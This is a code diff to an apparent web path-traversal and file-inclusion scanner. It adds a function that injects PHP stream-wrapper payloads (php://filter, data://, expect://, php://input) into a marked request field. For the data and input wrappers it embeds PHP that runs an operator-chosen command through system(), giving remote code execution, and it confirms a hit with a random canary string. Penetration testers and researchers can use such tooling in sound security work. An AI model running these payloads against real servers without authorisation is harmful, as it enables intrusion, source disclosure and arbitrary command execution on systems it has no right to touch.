@@ -1,5 +1,6 @@
 """Network layer: inject payloads, send via a Session, classify responses."""
 import time
+import uuid
 
 from .payloads import generate_payloads
 from .detector import classify
@@ -7,6 +8,7 @@ from .targets import load as load_targets, DEFAULT_TARGETS  # noqa: F401 (re-exp
 from .transport import (  # noqa: F401 (inject/FUZZ re-exported)
     inject, inject_body, inject_json, send, FUZZ,
 )
+from .wrappers import php_filter_read, data_wrapper, expect_wrapper, php_input_body
 
 
 def _prepare(url_template, data_template, json_template, payload):
@@ -87,3 +89,45 @@ def scan(session, url_template, depth=8, delay=0.3, stop_on_first=True,
                 return hits
         time.sleep(delay)
     return hits
+
+
+def run_wrapper(session, url_template, wrapper, resource=None, cmd=None,
+                method=None, data_template=None, json_template=None):
+    """Single-shot file-inclusion wrapper probe (php://filter, data://, expect://,
+    php://input). Confirms via php-source disclosure or an RCE canary."""
+    fuzz_in = (json_template if json_template is not None else
+               data_template if data_template is not None else url_template)
+    if FUZZ not in (fuzz_in or ""):
+        raise ValueError("A FUZZ marker is required (in the URL, --data, or --json).")
+
+    nonce = "TRAVERSE_" + uuid.uuid4().hex[:12]
+    body = None
+    if wrapper == "filter":
+        payload, use_nonce = php_filter_read(resource), None
+    elif wrapper == "data":
+        payload = data_wrapper(f"<?php echo '{nonce}'; system('{cmd}'); ?>")
+        use_nonce = nonce
+    elif wrapper == "expect":
+        payload, use_nonce = expect_wrapper(f"echo {nonce}; {cmd}"), nonce
+    elif wrapper == "input":
+        marker, body = php_input_body(f"<?php echo '{nonce}'; system('{cmd}'); ?>")
+        payload, use_nonce = marker, nonce
+    else:
+        raise ValueError(f"unknown wrapper: {wrapper}")
+
+    if json_template is not None:
+        url, data, json_body, m = url_template, None, inject_json(json_template, payload), method or "POST"
+    elif data_template is not None:
+        url, data, json_body, m = url_template, inject_body(data_template, payload), None, method or "POST"
+    else:
+        url, data, json_body, m = inject(url_template, payload), None, None, method or "GET"
+    if body is not None:  # php://input carries the PHP in the request body
+        data, m = body, method or "POST"
+
+    resp = send(session, m, url, data=data, json_body=json_body)
+    result = classify(resp.text, resp.status_code, None, 0, 200, nonce=use_nonce)
+    if result["hit"]:
+        return [{"target": f"{wrapper}://{resource or cmd}", "category": "lfi",
+                 "payload": payload, "method": m,
+                 "confidence": result["confidence"], "snippet": result["snippet"]}]
+    return []
